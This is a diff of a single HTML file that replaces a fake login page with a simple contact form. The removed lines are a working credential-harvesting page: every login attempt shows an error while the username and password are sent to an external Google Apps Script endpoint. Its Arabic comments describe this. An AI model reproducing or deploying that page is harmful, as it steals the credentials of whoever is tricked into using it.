@@ -1,64 +1,32 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
 <meta charset="UTF-8">
-<title>Login Page</title>
-<style>
-body { 
-    font-family: Arial; 
-    display: flex; 
-    justify-content: center; 
-    align-items: center; 
-    height: 100vh; 
-    background: #f0f0f0; 
-}
-form { 
-    background: #fff; 
-    padding: 20px; 
-    border-radius: 8px; 
-    box-shadow: 0 0 10px rgba(0,0,0,0.2); 
-}
-input { 
-    display: block; 
-    margin: 10px 0; 
-    padding: 8px; 
-    width: 200px; 
-}
-button { 
-    padding: 8px 12px; 
-    cursor: pointer;
-}
-h2 { text-align: center; }
-</style>
+<title>Contact Form</title>
 </head>
 <body>
-<form id="loginForm">
-  <h2>Login</h2>
-  <input type="text" id="username" placeholder="Username">
-  <input type="password" id="password" placeholder="Password">
-  <button type="button" onclick="login()">Login</button>
+
+<form id="contactForm">
+  <input type="text" name="name" placeholder="Name" required>
+  <input type="email" name="email" placeholder="Email" required>
+  <textarea name="message" placeholder="Message" required></textarea>
+  <button type="submit">Send</button>
 </form>
 
 <script>
-function login() {
-  const user = document.getElementById('username').value;
-  const pass = document.getElementById('password').value;
+document.getElementById("contactForm").addEventListener("submit", function(e) {
+  e.preventDefault();
 
-  // أي محاولة → تظهر رسالة خطأ
-  alert("Incorrect login!"); 
+  fetch("WEB_APP_URL_HERE", {
+    method: "POST",
+    mode: "no-cors",
+    body: new FormData(this)
+  });
 
-  // تسجل المحاولة في Console
-  console.log("Attempted login - Username:", user, "Password:", pass);
-
-  // **إرسال البيانات إلى Google Sheet عبر Web App**
-  fetch('https://script.google.com/macros/s/AKfycbxShq87r7mF6B4ccniK_meGVD7r8qJC_wZUslzxw3-QEG94Ovzgz7sh1FMiDPTeQa4D/exec
-    ', {
-    method: 'POST',
-    body: new URLSearchParams({username: user, password: pass})
-  })
-  .then(response => console.log('Sent to Sheet:', response))
-  .catch(err => console.error('Error:', err));
-}
+  alert("Message sent!");
+  this.reset();
+});
 </script>
+
 </body>
 </html>
